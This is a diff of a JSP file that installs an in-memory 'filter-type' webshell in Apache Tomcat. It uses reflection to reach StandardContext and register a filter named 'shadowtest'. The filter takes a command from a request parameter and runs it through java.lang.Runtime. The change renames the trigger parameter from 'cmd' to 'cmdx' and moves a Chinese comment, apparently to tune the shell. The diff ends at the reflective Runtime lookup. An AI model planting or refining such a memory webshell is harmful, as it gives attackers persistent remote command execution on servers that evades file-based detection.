@@ -1,4 +1,4 @@
-//filter型内存马通过Class.forName反射调用
+
 <%@ page import="org.apache.catalina.core.ApplicationContext" %>
 <%@ page import="java.lang.reflect.Field" %>
 <%@ page import="org.apache.catalina.core.StandardContext" %>
@@ -15,6 +15,7 @@
 <%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
 
 <%
+    //filter型内存马通过Class.forName反射调用
     final String name = "shadowtest";
     ServletContext servletContext = request.getSession().getServletContext();
 
@@ -40,8 +41,8 @@
             @Override
             public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
                 HttpServletRequest req = (HttpServletRequest) servletRequest;
-                if (req.getParameter("cmd") != null){
-                    String cmd = request.getParameter("cmd");
+                if (req.getParameter("cmdx") != null){
+                    String cmd = request.getParameter("cmdx");
                     Class rt = null;
                     try {
                         rt = Class.forName("java.lang.Runtime");
